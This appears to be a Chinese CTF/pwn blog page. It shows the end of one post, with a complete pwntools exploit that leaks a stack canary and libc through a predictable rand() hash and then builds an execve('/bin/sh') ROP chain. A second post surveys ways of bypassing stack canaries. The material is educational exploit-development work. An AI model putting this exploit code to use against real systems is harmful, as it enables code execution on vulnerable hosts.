R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al /* <span class="string">&#x27;&gt; &#x27;</span> */</span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc70</span> ◂— <span class="number">0xd68</span> /* <span class="string">&#x27;h\r&#x27;</span> */</span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>搜索一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0x9bf0</span></span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7fa54e0</span> <span class="number">0xf5fff69bf0</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc86</span> <span class="number">0x9260245d5a0d9bf0</span></span><br></pre></td></tr></table></figure>
<p>然后不知道从哪里掏出来“main”的返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x555555400d80</span></span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x555555400dfe</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7dea0b3</span> __libc_start_main+<span class="number">243</span></span><br></pre></td></tr></table></figure>
<p>搜索一下这个地址，就得到了存放“返回地址”的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7dea0b3</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdd18</span> <span class="number">0x7ffff7dea0b3</span></span><br></pre></td></tr></table></figure>
<p>两者相减计算偏移：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd18</span> - <span class="number">0x7fffffffdc86</span> = <span class="number">146</span></span><br><span class="line"><span class="number">146</span> / <span class="number">2</span> = <span class="number">73</span></span><br></pre></td></tr></table></figure>
<p>放入刚刚的模块中“__libc_start_main”的地址就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main))</span><br></pre></td></tr></table></figure>
<p>最后可以用“one_gadget”来打</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4f3d5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f432</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a41c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"><span class="keyword">import</span> ctypes </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">stack_libc_start_main_offset = <span class="number">73</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    <span class="comment"># Correct for the 1 and 0 collision.</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    libc = ctypes.cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main-<span class="number">243</span>))</span><br><span class="line"></span><br><span class="line">libc_start_main_offset = libc.libc_start_main_return</span><br><span class="line">libc_base=__libc_start_main-libc_start_main_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">poprdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">poprsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">poprdx_poprbx_ret=libc_base+<span class="number">0x0000000000162866</span></span><br><span class="line">binsh_libc=libc_base+<span class="number">0x00000000001b75aa</span></span><br><span class="line">execve_libc=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;execve &gt;&gt; &#x27;</span> +<span class="built_in">hex</span>(execve_libc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi_ret)+p64(binsh_libc)</span><br><span class="line">payload+=p64(poprsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprdx_poprbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve_libc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/105318835">pwn题查找字符串方法记录</a></p>
<hr>
<p><strong>PS：</strong></p>
<p>我这个libc版本打不了“one_gadget”，只能自己凑了</p>
<p>还有一个问题：用system打不通，但execve一下子就通了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/pwn%E7%A9%BFcanary/" class="post-title-link" itemprop="url">pwn穿canary</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-16 18:48:35" itemprop="dateModified" datetime="2022-03-16T18:48:35+08:00">2022-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
<hr>
<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
<p>​        //这个图的上面是高地址，下面是低地址</p>
<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
<p><strong>在gcc中使用canary：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>可以计算出偏移为“17”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>​        //通常把gdb和终端结合起来看效果更好</p>
<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
<p>当canary被覆盖时，程序会进行上述报错</p>
<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
